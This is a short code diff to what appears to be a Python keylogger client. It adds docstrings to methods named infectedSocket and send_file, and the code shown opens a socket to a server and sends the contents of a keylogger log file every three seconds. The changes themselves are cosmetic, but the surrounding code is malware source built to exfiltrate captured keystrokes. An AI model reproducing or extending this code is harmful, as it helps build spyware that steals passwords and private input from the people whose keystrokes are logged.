@@ -13,16 +13,18 @@ class Client():
         self.infectedSocket()
 
     def infectedSocket(self):
+        """Connect to a server and start sharing data"""
+
         clt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         SERVER = '127.0.0.1'
         PORT = 22344
         clt.connect((SERVER, PORT))
-        #sendingThread = Thread(target = self.send_file, args = (clt,))
         self.sched.add_job(self.send_file, 'interval', args=(clt,), seconds = 3)
         self.sched.start()
         
     def send_file(self,s):
-
+        """Read the keylogger file line by line and send it to the server for process"""
+        
         self.lock.acquire()
         with open(self.filename, "r") as f:
             assert self.BUFFER_SIZE > 0
@@ -37,6 +39,7 @@ class Client():
 
 
     def show_percentage(self,p):
+        """Utility function to prettify output in cmd"""
 
         chops = 40
         if p > 1 or p < 0:
